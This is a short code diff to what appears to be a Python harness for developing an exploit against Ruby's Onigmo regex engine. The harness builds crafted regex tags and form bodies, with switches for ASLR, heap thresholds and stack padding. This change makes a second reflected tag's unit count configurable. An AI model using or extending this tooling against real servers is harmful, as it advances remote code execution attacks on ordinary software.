@@ -155,6 +155,7 @@ def main() -> int:
     timeout = float(os.environ.get("RUBY2SHELL_ONIGMO_TIMEOUT", "60"))
     second = bool(os.environ.get("RUBY2SHELL_ONIGMO_SECOND"))
     second_reflect = bool(os.environ.get("RUBY2SHELL_ONIGMO_SECOND_REFLECT"))
+    second_units = int(os.environ.get("RUBY2SHELL_ONIGMO_SECOND_UNITS", "2"))
     trace = bool(os.environ.get("RUBY2SHELL_ONIGMO_TRACE"))
     multipart = bool(os.environ.get("RUBY2SHELL_ONIGMO_MULTIPART"))
     pattern = "TODO" if mode == "safe" else build_tag(units, pad, reflect, unit, layout, stack_pad, anchor, atomic)
@@ -162,7 +163,7 @@ def main() -> int:
     fields.extend((f"x{i}", "X" * extra_len) for i in range(extra_params))
     body, content_type = form_body(fields, multipart)
     aslr_off = bool(os.environ.get("RUBY2SHELL_ONIGMO_ASLR_OFF"))
-    second_tag = build_tag(2, 0, True, unit, layout, 0, anchor, atomic) if second_reflect else "TODO"
+    second_tag = build_tag(second_units, 0, True, unit, layout, 0, anchor, atomic) if second_reflect else "TODO"
     second_body = urlencode({"_method": "GET", "tag": second_tag}).encode()
 
     env = os.environ.copy()
@@ -213,6 +214,7 @@ def main() -> int:
         "mmap_threshold": env.get("MALLOC_MMAP_THRESHOLD_"),
         "trace": trace,
         "second": second,
+        "second_units": second_units,
         "second_reflect": second_reflect,
         "multipart": multipart,
         "aslr_off": aslr_off,
